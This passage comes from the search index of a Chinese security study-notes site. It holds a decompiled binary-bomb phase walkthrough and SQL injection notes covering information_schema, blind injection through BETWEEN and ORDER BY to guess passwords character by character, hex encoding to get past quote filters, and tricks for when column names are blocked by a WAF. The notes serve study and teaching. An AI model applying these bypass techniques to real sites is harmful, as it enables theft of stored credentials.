\u60ca\u4e86\uff0c\u8fd9\u4e2a\u6570\u7ec4\u5c45\u7136\u4e0d\u662f\u4ece0\u5f00\u59cb\u7684 \u4e8e\u662f\u5c31 \u8fd9\u5e45\u56fe\u5199\u7684\u5f88\u6e05\u695a\u4e86 \u7136\u540e\u8f6c\u6362\u4e00\u4e0b ok\u7b2c\u4e94\u5173\u6210\u4e86","title":"\u7b2c\u4e94\u5173"},{"location":"reverse/bomb/#_6","text":"4 3 2 1 6 5 \u5173\u952e\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 __int64 __fastcall phase_6 ( __int64 a1 ) { int * v1 ; // r13@1 signed int v2 ; // er12@1 signed int v3 ; // ebx@5 char * v4 ; // rax@10 unsigned __int64 v5 ; // rsi@12 _QWORD * v6 ; // rdx@13 signed int v7 ; // eax@13 int v8 ; // ecx@17 __int64 v9 ; // rbx@19 char * v10 ; // rax@19 __int64 i ; // rcx@19 __int64 v12 ; // rdx@20 signed int v13 ; // ebp@22 __int64 result ; // rax@23 int v15 [ 6 ]; // [sp+0h] [bp-78h]@1 char v16 ; // [sp+18h] [bp-60h]@11 __int64 v17 ; // [sp+20h] [bp-58h]@16 char v18 ; // [sp+28h] [bp-50h]@19 char v19 ; // [sp+50h] [bp-28h]@20 v1 = v15 ; read_six_numbers ( a1 , ( __int64 ) v15 ); v2 = 0 ; while ( 1 ) { if ( ( unsigned int )( * v1 - 1 ) > 5 ) explode_bomb (); if ( ++ v2 == 6 ) break ; v3 = v2 ; do { if ( * v1 == v15 [ v3 ] ) explode_bomb (); ++ v3 ; } while ( v3 <= 5 ); ++ v1 ; } v4 = ( char * ) v15 ; do { * ( _DWORD * ) v4 = 7 - * ( _DWORD * ) v4 ; v4 += 4 ; } while ( v4 != & v16 ); v5 = 0LL ; do { v8 = v15 [ v5 / 4 ]; if ( v8 <= 1 ) { v6 = & node1 ; } else { v7 = 1 ; v6 = & node1 ; do { v6 = ( _QWORD * ) v6 [ 1 ]; ++ v7 ; } while ( v7 != v8 ); } * ( __int64 * )(( char * ) & v17 + 2 * v5 ) = ( __int64 ) v6 ; v5 += 4LL ; } while ( v5 != 24 ); v9 = v17 ; v10 = & v18 ; for ( i = v17 ; ; i = v12 ) { v12 = * ( _QWORD * ) v10 ; * ( _QWORD * )( i + 8 ) = * ( _QWORD * ) v10 ; v10 += 8 ; if ( v10 == & v19 ) break ; } * ( _QWORD * )( v12 + 8 ) = 0LL ; v13 = 5 ; do { result = ** ( _DWORD ** )( v9 + 8 ); if ( * ( _DWORD * ) v9 < ( signed int ) result ) explode_bomb (); v9 = * ( _QWORD * )( v9 + 8 ); -- v13 ; } while ( v13 ); return result ; } \u4e00\u4e2a\u4e2a\u5faa\u73af\u6765\u770b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 v1 = v15 ; read_six_numbers ( a1 , ( __int64 ) v15 ); v2 = 0 ; while ( 1 ) { if ( ( unsigned int )( * v1 - 1 ) > 5 ) //\u904d\u5386\u6570\u7ec4\u6bcf\u4e00\u4e2a\u90fd\u5fc5\u987b\u5927\u4e8e6 explode_bomb (); if ( ++ v2 == 6 ) break ; v3 = v2 ; do { if ( * v1 == v15 [ v3 ] ) //\u6bcf\u4e2a\u6570\u90fd\u4e0d\u80fd\u76f8\u7b49 explode_bomb (); ++ v3 ; } while ( v3 <= 5 ); ++ v1 ; } 1 2 3 4 5 6 7 v4 = ( char * ) v15 ; do { * ( _DWORD * ) v4 = 7 - * ( _DWORD * ) v4 ; v4 += 4 ; } while ( v4 != & v16 ); \u5c06\u6808\u4e2d\u76846\u4e2a\u503c\uff08\u5047\u8bbe\u4e3ax\uff09\u53d8\u4e3a7-x\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 v5 = 0LL ; do { v8 = v15 [ v5 / 4 ]; if ( v8 <= 1 ) { v6 = & node1 ; } else { v7 = 1 ; v6 = & node1 ; do { v6 = ( _QWORD * ) v6 [ 1 ]; //\u8fd9\u91cc\u5176\u5b9e\u662f\u4e00\u4e2a\u94fe\u8868\u64cd\u4f5c ++ v7 ; } while ( v7 != v8 ); } * ( __int64 * )(( char * ) & v17 + 2 * v5 ) = ( __int64 ) v6 ; v5 += 4LL ; } while ( v5 != 24 ); rdx\u5904\u4e0b\u65ad\u70b9\uff0c\u770b\u5230\u8fd9\u4e2a\uff1a","title":"\u7b2c\u516d\u5173"},{"location":"reverse/bomb/#_7","text":"","title":"\u53c2\u8003"},{"location":"web_sec/SQL/","text":"SQL\u6ce8\u5165 \u00b6","title":"SQL\u6ce8\u5165"},{"location":"web_sec/SQL/#sql","text":"","title":"SQL\u6ce8\u5165"},{"location":"web_sec/SQL/blindSQL/","text":"","title":"blindSQL"},{"location":"web_sec/SQL/mysql\u57fa\u7840\u77e5\u8bc6/","text":"mysql\u57fa\u7840\u77e5\u8bc6 \u00b6 information_schema\u8fd9\u8fd9\u4e2a\u6570\u636e\u5e93\u4e2d\u4fdd\u5b58\u4e86MySQL\u670d\u52a1\u5668\u6240\u6709\u6570\u636e\u5e93\u7684\u4fe1\u606f\u3002 \u5982\u6570\u636e\u5e93\u540d\uff0c\u6570\u636e\u5e93\u7684\u8868\uff0c\u8868\u680f\u7684\u6570\u636e\u7c7b\u578b\u4e0e\u8bbf\u95ee\u6743\u9650\u7b49\u3002 \u518d\u7b80\u5355\u70b9\uff0c\u8fd9\u53f0MySQL\u670d\u52a1\u5668\u4e0a\uff0c\u5230\u5e95\u6709\u54ea\u4e9b\u6570\u636e\u5e93\u3001\u5404\u4e2a\u6570\u636e\u5e93\u6709\u54ea\u4e9b\u8868\uff0c \u6bcf\u5f20\u8868\u7684\u5b57\u6bb5\u7c7b\u578b\u662f\u4ec0\u4e48\uff0c\u5404\u4e2a\u6570\u636e\u5e93\u8981\u4ec0\u4e48\u6743\u9650\u624d\u80fd\u8bbf\u95ee\uff0c\u7b49\u7b49\u4fe1\u606f\u90fd\u4fdd\u5b58\u5728information_schema\u91cc\u9762\u3002 information_schema\u7684\u8868schemata\u4e2d\u7684\u5217schema_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217column_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u5217\u7684\u540d\u5b57","title":"mysql\u57fa\u7840\u77e5\u8bc6"},{"location":"web_sec/SQL/mysql\u57fa\u7840\u77e5\u8bc6/#mysql","text":"information_schema\u8fd9\u8fd9\u4e2a\u6570\u636e\u5e93\u4e2d\u4fdd\u5b58\u4e86MySQL\u670d\u52a1\u5668\u6240\u6709\u6570\u636e\u5e93\u7684\u4fe1\u606f\u3002 \u5982\u6570\u636e\u5e93\u540d\uff0c\u6570\u636e\u5e93\u7684\u8868\uff0c\u8868\u680f\u7684\u6570\u636e\u7c7b\u578b\u4e0e\u8bbf\u95ee\u6743\u9650\u7b49\u3002 \u518d\u7b80\u5355\u70b9\uff0c\u8fd9\u53f0MySQL\u670d\u52a1\u5668\u4e0a\uff0c\u5230\u5e95\u6709\u54ea\u4e9b\u6570\u636e\u5e93\u3001\u5404\u4e2a\u6570\u636e\u5e93\u6709\u54ea\u4e9b\u8868\uff0c \u6bcf\u5f20\u8868\u7684\u5b57\u6bb5\u7c7b\u578b\u662f\u4ec0\u4e48\uff0c\u5404\u4e2a\u6570\u636e\u5e93\u8981\u4ec0\u4e48\u6743\u9650\u624d\u80fd\u8bbf\u95ee\uff0c\u7b49\u7b49\u4fe1\u606f\u90fd\u4fdd\u5b58\u5728information_schema\u91cc\u9762\u3002 information_schema\u7684\u8868schemata\u4e2d\u7684\u5217schema_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868tables\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_schema\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217table_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u540d\u5b57 information_schema\u7684\u8868columns\u4e2d\u7684\u5217column_name\u8bb0\u5f55\u4e86\u6240\u6709\u6570\u636e\u5e93\u7684\u8868\u7684\u5217\u7684\u540d\u5b57","title":"mysql\u57fa\u7840\u77e5\u8bc6"},{"location":"web_sec/SQL/sql\u57fa\u672c\u59ff\u52bf/","text":"SQL\u59ff\u52bf \u00b6 \u57fa\u672c\u77e5\u8bc6 \u00b6 1 2 3 4 5 information_schema.tables: \u67e5\u8be2\u8868\u540d:table_name \u5bf9\u5e94\u7684\u6570\u636e\u5e93\u540d: table_schema information_schema.columns: \u67e5\u8be2\u5217\u540d:column_name \u5bf9\u5e94\u7684\u8868\u540d:table_schemamysql\u76f2\u6ce8\u8bed\u53e5\u4e00\u822c\u5f62\u5f0f \u67e5\u8be2\u7ed3\u679c + \u6bd4\u8f83\u8fd0\u7b97\u7b26 + \u731c\u6d4b\u503c \u8054\u5408\u6ce8\u5165 \u00b6 \u5806\u53e0\u6ce8\u5165 \u00b6 \u8fd9\u4e2a\u59ff\u52bf\u4e4b\u524d\u6ca1\u89c1\u8fc7\uff0c\u4f46\u662f\u5f88\u597d\u7406\u89e3\uff0c\u4e0d\u8fc7\u4e3a\u4ec0\u4e48\u80fd\u591f\u4e00\u6b21\u6027\u6267\u884c\u591a\u6761\u8bed\u53e5\u5462\uff1f \u53c2\u8003 \u00b6 \u6700\u6c34\u7684sql\u6ce8\u5165\u603b\u7ed3","title":"SQL\u59ff\u52bf"},{"location":"web_sec/SQL/sql\u57fa\u672c\u59ff\u52bf/#sql","text":"","title":"SQL\u59ff\u52bf"},{"location":"web_sec/SQL/sql\u57fa\u672c\u59ff\u52bf/#_1","text":"1 2 3 4 5 information_schema.tables: \u67e5\u8be2\u8868\u540d:table_name \u5bf9\u5e94\u7684\u6570\u636e\u5e93\u540d: table_schema information_schema.columns: \u67e5\u8be2\u5217\u540d:column_name \u5bf9\u5e94\u7684\u8868\u540d:table_schemamysql\u76f2\u6ce8\u8bed\u53e5\u4e00\u822c\u5f62\u5f0f \u67e5\u8be2\u7ed3\u679c + \u6bd4\u8f83\u8fd0\u7b97\u7b26 + \u731c\u6d4b\u503c","title":"\u57fa\u672c\u77e5\u8bc6"},{"location":"web_sec/SQL/sql\u57fa\u672c\u59ff\u52bf/#_2","text":"","title":"\u8054\u5408\u6ce8\u5165"},{"location":"web_sec/SQL/sql\u57fa\u672c\u59ff\u52bf/#_3","text":"\u8fd9\u4e2a\u59ff\u52bf\u4e4b\u524d\u6ca1\u89c1\u8fc7\uff0c\u4f46\u662f\u5f88\u597d\u7406\u89e3\uff0c\u4e0d\u8fc7\u4e3a\u4ec0\u4e48\u80fd\u591f\u4e00\u6b21\u6027\u6267\u884c\u591a\u6761\u8bed\u53e5\u5462\uff1f","title":"\u5806\u53e0\u6ce8\u5165"},{"location":"web_sec/SQL/sql\u57fa\u672c\u59ff\u52bf/#_4","text":"\u6700\u6c34\u7684sql\u6ce8\u5165\u603b\u7ed3","title":"\u53c2\u8003"},{"location":"web_sec/SQL/sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f/","text":"sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f \u00b6 in\u64cd\u4f5c\u7b26 \u00b6 \u5bf9\u5b83\u7684\u63cf\u8ff0\uff1aIN\u64cd\u4f5c\u7b26\u5141\u8bb8\u6211\u4eec\u5728WHERE\u5b50\u53e5\u4e2d\u89c4\u5b9a\u591a\u4e2a\u503c\u3002\u4e5f\u5c31\u8bf4\u53ef\u4ee5\u8ba9\u6211\u4eec\u4f9d\u7167\u4e00\u6216\u6570\u4e2a\u4e0d\u8fde\u7eed(discrete)\u7684\u503c\u7684\u9650\u5236\u4e4b\u5185\u6293\u51fa\u6570\u636e\u5e93\u4e2d\u7684\u503c\u3002 \u90a3\u5b83\u662f\u5426\u53ef\u7528\u4e8e\u5728\u8fc7\u6ee4\u7b49\u53f7\u548c\u8fc7\u6ee4like\u7684sql\u6ce8\u5165\u60c5\u51b5\u4e0b\u5462\uff1f \u7b80\u5355\u53e5\u5f0f\u4e3e\u4f8b\uff1a betweeen \u00b6 \u5bf9\u5b83\u7684\u63cf\u8ff0\uff1aBETWEEN\u64cd\u4f5c\u7b26\u5728WHERE\u5b50\u53e5\u4e2d\u4f7f\u7528\uff0c\u4f5c\u7528\u662f\u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u7684\u6570\u636e\u8303\u56f4\u3002\u4e5f\u5c31\u8bf4\u8ba9\u6211\u4eec\u53ef\u4ee5\u8fd0\u7528\u4e00\u4e2a\u8303\u56f4(range)\u5185\u6293\u51fa\u6570\u636e\u5e93\u4e2d\u7684\u503c\u3002 \u90a3\u5b83\u662f\u5426\u4e5f\u53ef\u7528\u4e8e\u5728\u8fc7\u6ee4\u7b49\u53f7\u548c\u8fc7\u6ee4like\u7684sql\u6ce8\u5165\u60c5\u51b5\u4e0b\u5462\uff1f \u770b\u56fe\uff1a \u8fd8\u6015\u5355\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff1f\u518d\u770b\u4e2a\uff1a \u8fd8\u7a33\u7a33\u7684\u652f\u6301\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7\u59ff\u52bf\u3002 \u8fd9\u4e2a\u59ff\u52bf\u4e0b\u6362\u4e2a\u8bed\u53e5\uff1a select password from users where password between 'a' and 'd' order by \u00b6 \u8fd9\u4e2a\u662f\u5229\u7528orderby\u7684\u6392\u5e8f\u7684\u59ff\u52bf\u8fdb\u884c\u76f2\u6ce8\u3002\u5229\u7528\u6761\u4ef6\u5c31\u662f\u8981\u6709\u5bf9\u5e94\u6ce8\u5165\u51fa\u6570\u636e\u540c\u4e00\u884c\u7684\u5176\u4ed6\u5b57\u6bb5\u7684\u56de\u663e\uff08\u4f8b\u5982\uff1a\u60f3\u6ce8\u5165\u51fapassword\uff0cweb\u7aef\u8981\u6709username\u6216\u8005id\u6216\u8005\u2026\u2026\u7684\u56de\u663e\uff09\u3002 \u7b80\u5355\u793a\u4f8b\uff0c\u5047\u5982\u8981\u901a\u8fc7\u6ce8\u5165\u5f97\u5230abcde\u7528\u6237\u5bc6\u7801\uff0cweb\u9875\u9762\u6709\u4e2ausername\u56de\u663e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u59ff\u52bf\uff1a \u901a\u8fc7orderby3\u5bf9\u67e5\u8be2\u5230\u7684\u7b2c\u4e09\u4e2a\u5b57\u6bb5password\u8fdb\u884c\u6392\u5e8f\uff0c\u6539\u53d8select\u7684\u7b2c\u4e09\u5b57\u6bb5\u4f4d\u7f6e\u7684\u5185\u5bb9\uff0c\u5982\uff1aaa\u65f6\u5019web\u9875\u9762\u663e\u793ausername\u4e3atest\uff0cab\u65f6\u5019\u8fd8\u662f\u663e\u793a\u4e3atest\uff0cac\u65f6\u5019\u53d8\u6210\u4e86abcde\uff0c\u5c31\u8bc1\u660epassword\u524d\u4e24\u4e2a\u5b57\u7b26\u4e3aab\uff0c\u7136\u540e\u4f9d\u6b21\u518d\u5f80\u540e\u731c\u6d4b\u2026\u2026 \u8fd9\u4e2a\u59ff\u52bf\u518d\u7ed3\u5408\u4e2a\u811a\u672c\u5c82\u4e0d\u7f8e\u6ecb\u6ecb\u3002 \u5217\u540d\u6784\u9020 \u00b6 \u6ce8\u5165\u4e2d\u6709\u65f6\u5019\u4f1a\u9047\u5230\u5217\u540d\u88abwaf\u7684\u5957\u8def\uff0c\u4e07\u91cc\u4e4b\u884c\u53ea\u5dee\u51fa\u6570\u636e\u4e86\uff0c\u5c34\u5c2c\u4e0d\u5df2\u3002\u5728\u8fd9\u65f6\u5019\uff0c\u5c1d\u8bd5\u81ea\u884c\u6784\u9020\u4e00\u4e2a\u5217\u540d\u4e5f\u662f\u5f88\u4e0d\u9519\u7684\u9009\u62e9\u3002 \u4ece\u5b83\uff1a \u5230\u5b83\uff1a \u4e0d\u5c31\u65b0\u6784\u51fa\u4e86\u5217\u540d\uff1f \u518d\u5bf9\u5b83\u505a\u4e2a\u522b\u540d\u7136\u540e\u5c31\u53ef\u4ee5\u4e0d\u7528\u5217\u540d\u6ce8\u5165\u51fa\u6570\u636e\u4e86\uff1a \u4e34\u65f6\u53d8\u91cf \u00b6 \u4e34\u65f6\u53d8\u91cf\u662f\u4ec0\u4e48\u60f3\u5fc5\u5927\u5bb6\u90fd\u77e5\u9053\uff0c\u8fd9\u4e2a\u59ff\u52bf\u5462\uff5e\u9700\u8981\u4e34\u65f6\u53d8\u91cf\u7ed3\u5408into\u8bed\u6cd5\u6765\u8fdb\u884c\u5229\u7528\uff0c\u6817\u5b50 \u7528into\u5bf9\u4e34\u65f6\u53d8\u91cf@a\u8d4b\u503c\uff0c\u518d\u53bb\u67e5\u8be2@a\u662f\u53ef\u4ee5\u5f97\u5230\u8d4b\u503c\u5185\u5bb9\u7684\u3002 \u6ce8\u5165\u7684\u65f6\u5019\u600e\u4e48\u7528\u5462\uff1f \u770b\u8d77\u6765\u5f88\u597d\u5229\u7528\u7684\u6837\u5b50\uff0c\u5176\u5b9e\u653e\u5230web\u7f51\u7ad9\u4e0a\u5c31\u5f88\u9e21\u808b\u4e86\u3002\u540c\u4e00\u6ce8\u5165\u70b9\u5148web\u8bf7\u6c42\u8fdb\u884cinto\u7684\u4e34\u65f6\u53d8\u91cf\u8d4b\u503c\uff0c\u518dweb\u8bf7\u6c42\u8fdb\u884c\u4e34\u65f6\u53d8\u91cf\u67e5\u8be2\u65f6\u5019\uff0c\u4f1a\u53d1\u73b0\u5b83\u662f\u884c\u4e0d\u901a\u7684\u3002\u5728\u7b2c\u4e00\u4e2aweb\u8fde\u63a5\u7ed3\u675f\u65f6\u5019\uff0c\u4e34\u65f6\u53d8\u91cf\u91ca\u653e\u6389\u4e86\uff0c\u7b2c\u4e8c\u6b21web\u8bf7\u6c42\u67e5\u8be2\u662f\u627e\u4e0d\u5230\u4e0d\u5230\u5b83\u7684\u3002 \u8fd8\u6709\u4e2a\u5b9e\u7528\u7684\u5c0f\u5229\u7528\uff1a \u60f3\u5230\u4e86\u4ec0\u4e48\uff1f\u662f\u4e0d\u662f\u53ef\u4ee5\u7528\u6765orderby\u8fdb\u884c\u8868\u7684\u5217\u6570\u5224\u65ad\uff1f \u8fd9\u6837\u4e00\u6765\uff0c\u80fd\u7528\u5b83\u7684\u60c5\u51b5\u73b0\u6709\u4e09\u79cd\u573a\u666f\uff1a\u4e00\u4e2a\u5c31\u662f\u5b58\u5728\u5806\u53e0\u6ce8\u5165\u65f6\u5019\uff0c\u53e6\u4e00\u4e2a\u5c31\u662f\u540cweb\u9875\u9762\u4e24\u4e2a\u6ce8\u5165\u6f0f\u6d1e\u65f6\u5019\uff0c\u518d\u4e00\u4e2a\u5c31\u662f\u5f53orderby\u88abwaf\u540e\u7528\u6765\u5224\u65ad\u5b57\u6bb5\u6570\u76ee\u65f6\u5019\u3002 \u53c2\u8003 \u00b6 sql\u9a9a\u59ff\u52bf","title":"sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f"},{"location":"web_sec/SQL/sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f/#sql","text":"","title":"sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f"},{"location":"web_sec/SQL/sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f/#in","text":"\u5bf9\u5b83\u7684\u63cf\u8ff0\uff1aIN\u64cd\u4f5c\u7b26\u5141\u8bb8\u6211\u4eec\u5728WHERE\u5b50\u53e5\u4e2d\u89c4\u5b9a\u591a\u4e2a\u503c\u3002\u4e5f\u5c31\u8bf4\u53ef\u4ee5\u8ba9\u6211\u4eec\u4f9d\u7167\u4e00\u6216\u6570\u4e2a\u4e0d\u8fde\u7eed(discrete)\u7684\u503c\u7684\u9650\u5236\u4e4b\u5185\u6293\u51fa\u6570\u636e\u5e93\u4e2d\u7684\u503c\u3002 \u90a3\u5b83\u662f\u5426\u53ef\u7528\u4e8e\u5728\u8fc7\u6ee4\u7b49\u53f7\u548c\u8fc7\u6ee4like\u7684sql\u6ce8\u5165\u60c5\u51b5\u4e0b\u5462\uff1f \u7b80\u5355\u53e5\u5f0f\u4e3e\u4f8b\uff1a","title":"in\u64cd\u4f5c\u7b26"},{"location":"web_sec/SQL/sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f/#betweeen","text":"\u5bf9\u5b83\u7684\u63cf\u8ff0\uff1aBETWEEN\u64cd\u4f5c\u7b26\u5728WHERE\u5b50\u53e5\u4e2d\u4f7f\u7528\uff0c\u4f5c\u7528\u662f\u9009\u53d6\u4ecb\u4e8e\u4e24\u4e2a\u503c\u4e4b\u95f4\u7684\u6570\u636e\u8303\u56f4\u3002\u4e5f\u5c31\u8bf4\u8ba9\u6211\u4eec\u53ef\u4ee5\u8fd0\u7528\u4e00\u4e2a\u8303\u56f4(range)\u5185\u6293\u51fa\u6570\u636e\u5e93\u4e2d\u7684\u503c\u3002 \u90a3\u5b83\u662f\u5426\u4e5f\u53ef\u7528\u4e8e\u5728\u8fc7\u6ee4\u7b49\u53f7\u548c\u8fc7\u6ee4like\u7684sql\u6ce8\u5165\u60c5\u51b5\u4e0b\u5462\uff1f \u770b\u56fe\uff1a \u8fd8\u6015\u5355\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff1f\u518d\u770b\u4e2a\uff1a \u8fd8\u7a33\u7a33\u7684\u652f\u6301\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7\u59ff\u52bf\u3002 \u8fd9\u4e2a\u59ff\u52bf\u4e0b\u6362\u4e2a\u8bed\u53e5\uff1a select password from users where password between 'a' and 'd'","title":"betweeen"},{"location":"web_sec/SQL/sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f/#order-by","text":"\u8fd9\u4e2a\u662f\u5229\u7528orderby\u7684\u6392\u5e8f\u7684\u59ff\u52bf\u8fdb\u884c\u76f2\u6ce8\u3002\u5229\u7528\u6761\u4ef6\u5c31\u662f\u8981\u6709\u5bf9\u5e94\u6ce8\u5165\u51fa\u6570\u636e\u540c\u4e00\u884c\u7684\u5176\u4ed6\u5b57\u6bb5\u7684\u56de\u663e\uff08\u4f8b\u5982\uff1a\u60f3\u6ce8\u5165\u51fapassword\uff0cweb\u7aef\u8981\u6709username\u6216\u8005id\u6216\u8005\u2026\u2026\u7684\u56de\u663e\uff09\u3002 \u7b80\u5355\u793a\u4f8b\uff0c\u5047\u5982\u8981\u901a\u8fc7\u6ce8\u5165\u5f97\u5230abcde\u7528\u6237\u5bc6\u7801\uff0cweb\u9875\u9762\u6709\u4e2ausername\u56de\u663e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u59ff\u52bf\uff1a \u901a\u8fc7orderby3\u5bf9\u67e5\u8be2\u5230\u7684\u7b2c\u4e09\u4e2a\u5b57\u6bb5password\u8fdb\u884c\u6392\u5e8f\uff0c\u6539\u53d8select\u7684\u7b2c\u4e09\u5b57\u6bb5\u4f4d\u7f6e\u7684\u5185\u5bb9\uff0c\u5982\uff1aaa\u65f6\u5019web\u9875\u9762\u663e\u793ausername\u4e3atest\uff0cab\u65f6\u5019\u8fd8\u662f\u663e\u793a\u4e3atest\uff0cac\u65f6\u5019\u53d8\u6210\u4e86abcde\uff0c\u5c31\u8bc1\u660epassword\u524d\u4e24\u4e2a\u5b57\u7b26\u4e3aab\uff0c\u7136\u540e\u4f9d\u6b21\u518d\u5f80\u540e\u731c\u6d4b\u2026\u2026 \u8fd9\u4e2a\u59ff\u52bf\u518d\u7ed3\u5408\u4e2a\u811a\u672c\u5c82\u4e0d\u7f8e\u6ecb\u6ecb\u3002","title":"order by"},{"location":"web_sec/SQL/sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f/#_1","text":"\u6ce8\u5165\u4e2d\u6709\u65f6\u5019\u4f1a\u9047\u5230\u5217\u540d\u88abwaf\u7684\u5957\u8def\uff0c\u4e07\u91cc\u4e4b\u884c\u53ea\u5dee\u51fa\u6570\u636e\u4e86\uff0c\u5c34\u5c2c\u4e0d\u5df2\u3002\u5728\u8fd9\u65f6\u5019\uff0c\u5c1d\u8bd5\u81ea\u884c\u6784\u9020\u4e00\u4e2a\u5217\u540d\u4e5f\u662f\u5f88\u4e0d\u9519\u7684\u9009\u62e9\u3002 \u4ece\u5b83\uff1a \u5230\u5b83\uff1a \u4e0d\u5c31\u65b0\u6784\u51fa\u4e86\u5217\u540d\uff1f \u518d\u5bf9\u5b83\u505a\u4e2a\u522b\u540d\u7136\u540e\u5c31\u53ef\u4ee5\u4e0d\u7528\u5217\u540d\u6ce8\u5165\u51fa\u6570\u636e\u4e86\uff1a","title":"\u5217\u540d\u6784\u9020"},{"location":"web_sec/SQL/sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f/#_2","text":"\u4e34\u65f6\u53d8\u91cf\u662f\u4ec0\u4e48\u60f3\u5fc5\u5927\u5bb6\u90fd\u77e5\u9053\uff0c\u8fd9\u4e2a\u59ff\u52bf\u5462\uff5e\u9700\u8981\u4e34\u65f6\u53d8\u91cf\u7ed3\u5408into\u8bed\u6cd5\u6765\u8fdb\u884c\u5229\u7528\uff0c\u6817\u5b50 \u7528into\u5bf9\u4e34\u65f6\u53d8\u91cf@a\u8d4b\u503c\uff0c\u518d\u53bb\u67e5\u8be2@a\u662f\u53ef\u4ee5\u5f97\u5230\u8d4b\u503c\u5185\u5bb9\u7684\u3002 \u6ce8\u5165\u7684\u65f6\u5019\u600e\u4e48\u7528\u5462\uff1f \u770b\u8d77\u6765\u5f88\u597d\u5229\u7528\u7684\u6837\u5b50\uff0c\u5176\u5b9e\u653e\u5230web\u7f51\u7ad9\u4e0a\u5c31\u5f88\u9e21\u808b\u4e86\u3002\u540c\u4e00\u6ce8\u5165\u70b9\u5148web\u8bf7\u6c42\u8fdb\u884cinto\u7684\u4e34\u65f6\u53d8\u91cf\u8d4b\u503c\uff0c\u518dweb\u8bf7\u6c42\u8fdb\u884c\u4e34\u65f6\u53d8\u91cf\u67e5\u8be2\u65f6\u5019\uff0c\u4f1a\u53d1\u73b0\u5b83\u662f\u884c\u4e0d\u901a\u7684\u3002\u5728\u7b2c\u4e00\u4e2aweb\u8fde\u63a5\u7ed3\u675f\u65f6\u5019\uff0c\u4e34\u65f6\u53d8\u91cf\u91ca\u653e\u6389\u4e86\uff0c\u7b2c\u4e8c\u6b21web\u8bf7\u6c42\u67e5\u8be2\u662f\u627e\u4e0d\u5230\u4e0d\u5230\u5b83\u7684\u3002 \u8fd8\u6709\u4e2a\u5b9e\u7528\u7684\u5c0f\u5229\u7528\uff1a \u60f3\u5230\u4e86\u4ec0\u4e48\uff1f\u662f\u4e0d\u662f\u53ef\u4ee5\u7528\u6765orderby\u8fdb\u884c\u8868\u7684\u5217\u6570\u5224\u65ad\uff1f \u8fd9\u6837\u4e00\u6765\uff0c\u80fd\u7528\u5b83\u7684\u60c5\u51b5\u73b0\u6709\u4e09\u79cd\u573a\u666f\uff1a\u4e00\u4e2a\u5c31\u662f\u5b58\u5728\u5806\u53e0\u6ce8\u5165\u65f6\u5019\uff0c\u53e6\u4e00\u4e2a\u5c31\u662f\u540cweb\u9875\u9762\u4e24\u4e2a\u6ce8\u5165\u6f0f\u6d1e\u65f6\u5019\uff0c\u518d\u4e00\u4e2a\u5c31\u662f\u5f53orderby\u88abwaf\u540e\u7528\u6765\u5224\u65ad\u5b57\u6bb5\u6570\u76ee\u65f6\u5019\u3002","title":"\u4e34\u65f6\u53d8\u91cf"},{"location":"web_sec/SQL/sql\u6ce8\u5165\u59ff\u52bf\u79ef\u7d2f/#_3","text":"sql\u9a9a\u59ff\u52bf","title":"\u53c2\u8003"},{"location":"web_sec/SQL/sql\u8bed\u53e5\u57fa\u672c\u77e5\u8bc6/","text":"SQL(\u7ed3\u6784\u5316\u67e5\u8be2\u8bed\u8a00)\u57fa\u672c\u77e5\u8bc6 \u00b6 select \u00b6 SELECT DISTINCT country FROM Websites; \u4ec5\u4ece \"Websites\" \u8868\u7684 